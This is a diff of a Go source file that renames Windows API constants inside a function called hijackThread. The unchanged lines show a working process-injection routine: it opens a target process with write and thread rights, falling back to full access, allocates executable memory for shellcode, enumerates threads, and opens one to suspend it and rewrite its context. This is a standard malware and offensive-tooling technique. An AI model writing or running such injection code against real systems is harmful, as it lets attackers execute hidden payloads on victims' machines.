@@ -8,10 +8,10 @@ import (
 )
 
 func hijackThread(pid uint32, shellcode []byte) error {
-	da := uint32(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION)
+	da := uint32(processCreateThread | processVMOperation | processVMWrite | processVMRead | processQueryInformation)
 	hProc, _, _ := procOpenProcess.Call(uintptr(da), 0, uintptr(pid))
 	if hProc == 0 {
-		hProc, _, _ = procOpenProcess.Call(uintptr(PROCESS_ALL_ACCESS), 0, uintptr(pid))
+		hProc, _, _ = procOpenProcess.Call(uintptr(processAllAccess), 0, uintptr(pid))
 	}
 	if hProc == 0 {
 		return fmt.Errorf("OpenProcess(%d) failed", pid)
@@ -23,7 +23,7 @@ func hijackThread(pid uint32, shellcode []byte) error {
 		return fmt.Errorf("allocateRX failed: %w", err)
 	}
 
-	snap, _, _ := procCreateToolhelp32Snapshot.Call(TH32CS_SNAPTHREAD, 0)
+	snap, _, _ := procCreateToolhelp32Snapshot.Call(th32csSnapThread, 0)
 	if snap == 0 {
 		return fmt.Errorf("CreateToolhelp32Snapshot failed")
 	}
@@ -47,7 +47,7 @@ func hijackThread(pid uint32, shellcode []byte) error {
 	}
 
 	hThread, _, _ := procOpenThread.Call(
-		uintptr(THREAD_SUSPEND_RESUME|THREAD_GET_CONTEXT|THREAD_SET_CONTEXT),
+		uintptr(threadSuspendResume|threadGetContext|threadSetContext),
 		0, uintptr(targetTID),
 	)
 	if hThread == 0 {
@@ -61,7 +61,7 @@ func hijackThread(pid uint32, shellcode []byte) error {
 	}
 
 	var ctx threadContext
-	ctx.contextFlags = CONTEXT_FULL
+	ctx.contextFlags = contextFull
 	r2, _, _ := procGetThreadContext.Call(hThread, uintptr(unsafe.Pointer(&ctx)))
 	if r2 == 0 {
 		procResumeThread.Call(hThread)
